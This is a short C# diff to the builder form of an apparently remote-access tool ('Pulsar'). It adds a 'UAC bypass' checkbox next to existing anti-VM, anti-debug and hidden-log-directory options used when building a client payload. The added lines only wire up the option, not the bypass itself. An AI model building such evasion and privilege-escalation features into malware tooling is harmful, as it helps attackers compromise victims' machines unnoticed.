@@ -386,6 +386,11 @@ namespace Pulsar.Server.Forms
             HasChanged();
         }
 
+        private void chkUACBypass_CheckedChanged(object sender, EventArgs e)
+        {
+            HasChanged();
+        }
+
         private void btnBrowseIcon_Click(object sender, EventArgs e)
         {
             using (OpenFileDialog ofd = new OpenFileDialog())
@@ -466,6 +471,7 @@ namespace Pulsar.Server.Forms
             options.HideLogDirectory = chkHideLogDirectory.Checked;
             options.AntiVM = chkVM.Checked;
             options.AntiDebug = chkAntiDebug.Checked;
+            options.UACBypass = chkUACBypass.Checked;
 
             if (!File.Exists("client.bin"))
             {
